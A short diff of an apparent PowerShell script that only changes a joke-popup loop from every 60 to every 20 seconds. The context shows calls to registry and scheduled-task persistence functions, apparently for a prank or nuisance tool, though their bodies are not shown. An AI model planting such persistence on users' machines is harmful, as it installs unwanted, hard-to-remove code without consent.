@@ -43,9 +43,9 @@ function Set-ScheduledTaskPersistence {
 Set-RegistryPersistence
 Set-ScheduledTaskPersistence
 
-# Loop to Show Jokes every 60 seconds
+# Loop to Show Jokes every 20 seconds
 Write-Host "[+] Starting Random Joke Distraction..."
 while ($true) {
     Show-RandomJoke
-    Start-Sleep -Seconds 60 # Show a joke every 60 seconds
+    Start-Sleep -Seconds 20 # Show a joke every 20 seconds
 }
